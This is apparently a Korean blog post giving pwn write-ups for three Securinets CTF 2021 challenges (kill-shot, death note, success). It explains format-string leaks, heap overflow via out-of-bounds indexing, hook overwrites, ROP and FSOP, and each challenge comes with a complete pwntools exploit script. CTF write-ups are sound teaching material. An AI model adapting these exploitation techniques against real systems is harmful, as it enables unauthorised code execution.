---
layout: post
title: Securinets CTF 2021 pwn write-up
categories: ctf-write-up
tags: [ctf]
---

주말에 Securinets CTF를 잠깐 참여했다. 2~3시간 정도밖에 문제를 안봐서 다 풀지는 못했는데, 나름 재미있었다.


[kill-shot](#kill-shot)
[death-note](#death-note)
[success](#success)


---


# kill-shot (810pts, 24solves)

## Summary

1. Using fsb, leak pie_base and libc_base and stack_addr
2. malloc_hook → gets
3. gets(stack)
4. rop



- seccomp로 `openat`, `read`, `write`, `mmap` 함수들을 사용가능 하도록 허용
- fsb로 원하는 주소 leak 가능 (%n이 차단되어 있기 때문에 값을 쓰지는 못함)
- 원하는 주소에 원하는 값을 1회 쓸 수 있음



위와 같은 환경인데, 메모리 보호기법은 모두 걸려있었다. 그리고 malloc과 free를 하는 기능을 구현 해놓은 문제인데, 이때 실행 흐름을 제어하기 위해서 덮을 수 있는 곳은 `malloc_hook`, `free_hook`, `_rtld_global._dl_rtld_lock_recursive` 정도가 있을 것이다.



orw를 해야하기 때문에 단순히 흐름을 한 번만 제어하는 것은 의미가 없다. rop를 해야만 하는데, 처음 생각한 아이디어는 free_hook을 printf로 덮는 것이다. malloc을 통해 fsb 코드를 넣고 free를 호출해서 fsb를 발생시키면 뭔가를 할 수 있지 않을 까 싶었다.



근데 생각해보니, leak을 마음대로 할 수 있고 malloc의 인자는 사용자가 입력하는 값이기에 malloc_hook을 gets로 덮었다. malloc의 인자로 malloc_ret를 가리키는 스택 주소를 넣어주면 rop가 가능하고 openat, read, write는 모두 인자가 3개이기 때문에 return to csu 기법을 이용하였다.



openat의 첫 번째 인자는 -100을 넣어주면 open과 동일한 기능을 한다. 또한 로컬에선 fd가 3이지만 remote에선 fd가 5였다.

```python
from jsec import *

#p = process('./kill_shot')
p = remote("bin.q21.ctfsecurinets.com", 1338)
e = ELF('./kill_shot')
libc = e.libc

p.sendafter(': ', '%6$p%24$p%25$p')
stack = int(p.recv(14), 16)
pie_base = int(p.recv(14), 16) - 0x1240
libc_base = int(p.recv(14), 16) - 0x21b97

malloc_hook = libc_base + libc.sym['__malloc_hook']
gets = libc_base + libc.sym['gets']
openat = libc_base + libc.sym['openat']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']

print hex(stack)
print hex(pie_base)
print hex(libc_base)

p.sendafter(': ', str(malloc_hook))
p.sendafter(': ', p64(gets))

p.sendafter('t\n', '1')
p.sendafter(': ', str(stack - 0x138))

payload = ''
payload += p64(pie_base + csu_init(e))
payload += chain(stack-0x70, 0xffffffffffffffff - 99, stack-0x58, 0, pie_base + csu_call(e))
payload += chain(stack-0x68, 5, stack-0x50, 0x30, pie_base + csu_call(e))
payload += chain(stack-0x60, 1, stack-0x50, 0x30, pie_base + csu_call(e))
payload += p64(openat)
payload += p64(read)
payload += p64(write)
payload += '/home/ctf/flag.txt\x00'
p.sendline(payload)

p.interactive()
```

---



# death note (896pts, 18solves)

## Summary

1. Free the heap 8 times and libc leak
2. Using oob, Trigger the heap overflow
3. overwrite fd and get shell



0x80이상의 크기로 힙을 여러개 할당하고 8번 free 시키면 마지막에 free한 힙은 티케시가 아닌 언솔빈으로 들어간다. 이때 힙을 한 번 할당하면 이 위치에 힙이 할당되며 libc leak이 가능하게 된다.



그리고 Select 메뉴에 oob가 존재하는데 이를 이용하면 tcache entry 구조체에 있는 주소에 매우 큰 값을 입력 할 수 있다. 결과적으로 heap overflow가 발생하며 fd 값을 덮음으로써 원하는 주소에 힙을 할당받을 수 있게 된다.

```python
from pwn import *

#p = process("./death_note")
p = remote("bin.q21.ctfsecurinets.com", 1337)
e = ELF("./death_note")
libc = e.libc

def Malloc(size):
    p.sendafter('it\n', '1')
    p.sendafter(':', str(size))

def Edit(idx, name):
    p.sendafter('it\n', '2')
    p.sendafter(':', str(idx))
    p.sendafter(':', str(name))

def Free(idx):
    p.sendafter('it\n', '3')
    p.sendafter(':', str(idx))

def View(idx):
    p.sendafter('it\n', '4')
    p.sendafter(':', str(idx))

for i in range(10):
    Malloc(0xf0)

for i in range(8):
    Free(str(i))

Malloc(0x10)
View(0)

leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = leak - 0x3ebd90
print hex(libc_base)

Malloc(0x10)
Free(0)
Free(1)

Edit(-52, 'A' * 0xf8 + p64(0x21) + p64(libc.sym['__free_hook'] + libc_base))
Malloc(0x10)
Malloc(0x10)
Malloc(0x10)

Edit(2, p64(libc_base + libc.sym['system']))
Edit(1, '/bin/sh\x00')
Free(1)

p.interactive()
```

---



# success (957pts, 12solves)

## Summary

1. If you enter an invalid name, you can leak the pie address and libc address in the stack.
2. Filling the every value will result in a 4 byte overflow and can overwrite fd.
3. FSOP



잘못된 이름을 입력하면 printf("%s")로 사용자가 입력한 이름을 출력해주는데 이때 스택에 남아있는 데이터들을 출력시킬 수 있다. 이를 이용하여 pie 주소와 libc 주소를 알아낼 수 있다.



그 다음에 입력할 수 있는 값의 최대가 64인데 64를 입력하고 값을 채워보면 4byte overflow가 발생하고 fd의 하위 4byte를 변조할 수 있다. 이 4byte를 우리 인풋의 시작 부분으로 바꾸고, fsop 코드를 작성하면 되는데 문제는 float이기 때문에 이런 함수를 정의해서 사용했다.

```python
from struct import *

def p32_(d):
    return str(unpack("<f", p32(d))[0])
```



```python
from jsec import *

#p = process('./main2_success')
p = remote("bin.q21.ctfsecurinets.com", 1340)
e = ELF('./main2_success')
libc = e.libc

p.sendafter(": ", "1" * 8)
p.recvuntil("1" * 8)
pie_base = u64(p.recv(6).ljust(8, '\x00')) - 0x1090
print hex(pie_base)

p.sendafter(": ", "1" * 0x10)
p.recvuntil("1" * 0x10)
libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x3e82a0
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
print hex(libc_base)

p.sendlineafter(': ', '_' * 0x62)
p.sendafter(": ", "64")

for i in range(5):
    p.sendafter(': ', p32_(0x0))
    p.sendafter(': ', p32_(0x42424242))

a = ((binsh-100) / 2) + 1
print ("a: " + hex(a))

p.sendafter(': ', p32_(a & 0xffffffff))
p.sendafter(': ', p32_(a >> 32))

for i in range(2):
    p.sendafter(': ', p32_(1))
    p.sendafter(': ', p32_(0))

p.sendafter(': ', p32_(a & 0xffffffff))
p.sendafter(': ', p32_(a >> 32))

for i in range(8):
    p.sendafter(': ', p32_(0))
    p.sendafter(': ', p32_(0x41414141))

b = e.bss() + pie_base + 0x500
print ("b: " + hex(b))
p.sendafter(': ', p32_(b & 0xffffffff))
p.sendafter(': ', p32_(b >> 32))

for i in range(18):
    p.sendafter(': ', p32_(0))

fake = libc_base + 0x3e8368
print ("fake: " + hex(fake))

p.sendafter(': ', p32_(fake & 0xffffffff))
p.sendafter(': ', p32_(fake >> 32))

print ("system: " + hex(system))

p.sendafter(': ', p32_(system & 0xffffffff))
p.sendafter(': ', p32_(system >> 32))

for i in range(3):
    p.sendafter(': ', p32_(0))
    p.sendafter(': ', p32_(0))

p.sendafter(': ', p32_((0x202060 + pie_base) & 0xffffffff))
p.interactive()
```
